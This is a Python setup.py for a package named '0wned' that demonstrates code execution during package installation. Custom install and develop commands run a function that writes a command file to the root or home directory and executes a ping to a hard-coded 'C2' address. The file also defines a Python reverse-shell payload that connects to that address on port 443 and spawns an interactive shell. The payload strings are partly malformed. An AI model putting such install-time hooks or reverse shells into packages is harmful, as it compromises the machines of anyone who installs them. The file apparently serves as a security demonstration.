#!/usr/bin/env python

from __future__ import print_function

import getpass
import os
import time
import subprocess

from setuptools import setup
from setuptools.command.develop import develop
from setuptools.command.install import install

long_description_filename = os.path.join(
    os.path.dirname(os.path.abspath(__file__)), 'README.md')

with open(long_description_filename) as fd:
    long_description = fd.read()

FILENAME = '0wned.sh'
ROOT_PATH = os.path.join(os.path.abspath(os.sep), FILENAME)
USER_PATH = os.path.join(os.path.expanduser('~'), FILENAME)
USER = getpass.getuser()
TIME = int(time.time())
C2 = "192.168.249.128"
PORT = 443
PAYLOAD = "python3 -c 'import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("+C2+",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh -i\"])'"
PAYLOAD1 = "python3 -c 'os.system(\"ping -c 1 \" + "+C2+")'"


def touch_file():
    try:
        with open(ROOT_PATH, 'a') as root_fd:
            message = PAYLOAD1
            print(message)
            root_fd.write(message + '\n')
            # os.system("sudo chmod +x " + os.path.join(os.path.abspath(os.sep), FILENAME))
            subprocess.call([PAYLOAD1])
    except (IOError, OSError):
        try:
            with open(USER_PATH, 'a') as user_fd:
                message = PAYLOAD1
                print(message)
                user_fd.write(message + '\n')
                # os.system("sudo chmod +x " + os.path.join(os.path.expanduser('~'), FILENAME))
                subprocess.call([PAYLOAD1])
        except (IOError, OSError):
            print('Could not write to {!r} or {!r}'.format(ROOT_PATH, USER_PATH))
            print('What kind of tricky system are you running this on?')


class PostDevelopCommand(develop):
    def run(self):
        touch_file()
        develop.run(self)


class PostInstallCommand(install):
    def run(self):
        touch_file()
        install.run(self)


setup(
    name='0wned',
    version='0.9.4',
    description='Code execution via Python package installation.',
    long_description=long_description,
    long_description_content_type='text/markdown',
    url='https://github.com/mschwager/0wned',
    packages=[],
    license='GPLv3',
    classifiers=[
        'Environment :: Console',
        'License :: OSI Approved :: GNU General Public License v3 (GPLv3)',
        'Operating System :: MacOS :: MacOS X',
        'Operating System :: Microsoft :: Windows',
        'Operating System :: POSIX',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Topic :: Security',
    ],
    install_requires=[],
    tests_require=[],
    cmdclass={
        'develop': PostDevelopCommand,
        'install': PostInstallCommand,
    },
)
